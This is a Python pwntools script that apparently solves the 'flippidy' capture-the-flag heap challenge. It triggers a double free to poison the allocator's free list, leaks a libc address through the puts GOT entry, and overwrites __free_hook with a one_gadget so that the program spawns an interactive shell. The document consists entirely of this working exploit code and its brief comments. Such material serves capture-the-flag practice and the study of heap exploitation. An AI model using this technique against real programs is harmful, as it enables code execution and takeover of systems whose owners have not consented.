from pwn import *

io = process('./flippidy')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./flippidy')

def add(index, content):
    print(io.recvuntil(': '))
    io.sendline('1')
    print(io.recvuntil('Index: '))
    io.sendline(index)
    print(io.recvuntil('Content: '))
    io.sendline(content)

def flip():
    print(io.recvuntil(': '))
    io.sendline('2')

def exit():
    print(io.recvuntil(': '))
    io.sendline('3')

print(io.recvuntil(': '))
io.sendline('1')

add('0', p64(0x404020)) # trick program that 0x404020 is the fd pointer of the current heap struct
flip() # trigger double free

# HEAD <-- 0x404020 <-- 0x404040 <-- ...

add('0', p64(elf.got['puts'])*4+p64(0x404050))
io.recv(2)
libc.address = u64(io.recv(6).ljust(8, '\0'))-libc.sym['puts']
print('[+] libc: ', hex(libc.address))

# HEAD <-- 0x404040 <-- 0x404050 <-- ...

add('0', 'A'*16+p64(libc.sym['__free_hook']))

# HEAD <-- 0x404050 <-- __free_hook address <-- ...

add('0', '\0')

# HEAD <-- __free_hook address <-- ...

add('0', p64(libc.address+0x4f322))

# overwritten _free_hook address with one_gadget

flip()

# trigger the free --> call one_gadget to spawn shell

print("Hacked")
io.interactive()
